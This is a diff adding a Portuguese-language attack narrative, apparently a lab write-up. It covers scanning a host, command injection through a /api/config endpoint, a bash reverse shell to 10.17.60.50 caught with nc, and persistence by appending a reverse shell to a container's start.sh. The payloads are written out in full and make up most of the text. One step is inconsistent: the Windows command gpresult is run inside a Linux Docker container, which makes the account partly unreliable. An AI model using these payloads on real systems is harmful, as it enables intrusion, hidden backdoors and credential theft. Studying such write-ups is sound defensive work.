@@ -1,0 +1,33 @@
+Durante a fase de reconhecimento, o atacante utilizou o comando:
+
+nmap -p- --open -sV -T4 -oN full_scan.txt 10.10.50.200
+
+A varredura revelou que as portas 443 (HTTPS) e 8080 estavam abertas. A análise do certificado SSL indicou o domínio devpanel.acme.local. O atacante adicionou a entrada no /etc/hosts:
+
+echo "10.10.50.200 devpanel.acme.local" >> /etc/hosts
+
+A inspeção do site https://devpanel.acme.local:8080 revelou um sistema de monitoramento com endpoint /api/config. O atacante testou injeções e obteve resposta positiva ao comando:
+
+curl -X POST -d 'cfg=;id' https://devpanel.acme.local:8080/api/config
+
+A vulnerabilidade permitia execução arbitrária de comandos via injection na API. O atacante então inseriu um reverse shell para obter acesso remoto:
+
+curl -X POST -d "cfg=;bash -i >& /dev/tcp/10.17.60.50/4444 0>&1" https://devpanel.acme.local:8080/api/config
+
+No host, o listener foi iniciado:
+
+nc -lvnp 4444
+
+Com shell ativo, o atacante percebeu que o sistema rodava como um contêiner Docker. Para manter persistência, ele modificou o entrypoint da imagem com o comando:
+
+echo "bash -i >& /dev/tcp/10.17.60.50/4445 0>&1" >> /app/start.sh
+
+Também foi utilizada a técnica T1615 para listar as GPOs da máquina:
+
+gpresult /z > gpo.txt
+
+E posteriormente o atacante identificou no /var/www/html/.git/config o uso de credenciais expostas:
+
+git config --list
+
+Com base nisso, ele clonou repositórios internos com credenciais expostas.
